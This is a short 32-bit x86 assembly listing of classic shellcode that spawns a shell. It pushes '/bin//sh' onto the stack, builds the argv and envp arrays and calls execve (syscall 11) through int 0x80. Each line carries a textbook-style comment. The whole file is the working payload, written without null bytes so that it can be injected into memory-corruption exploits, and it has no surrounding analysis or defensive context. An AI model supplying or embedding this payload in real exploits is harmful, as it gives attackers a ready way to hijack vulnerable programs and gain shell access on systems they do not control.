BITS 32

; execve(const char *filename, char *const argv [], char *const envp[])
 xor eax, eax ; Zero out eax.
 push eax ; Push some nulls for string termination.
 push 0x68732f2f ; Push "//sh" to the stack.
 push 0x6e69622f ; Push "/bin" to the stack.
 mov ebx, esp ; Put the address of "/bin//sh" into ebx, via esp.
 push eax ; Push 32-bit null terminator to stack.
 mov edx, esp ; This is an empty array for envp.
 push ebx ; Push string addr to stack above null terminator.
 mov ecx, esp ; This is the argv array with string ptr.
 mov al, 11 ; Syscall #11.
 int 0x80 ; Do it.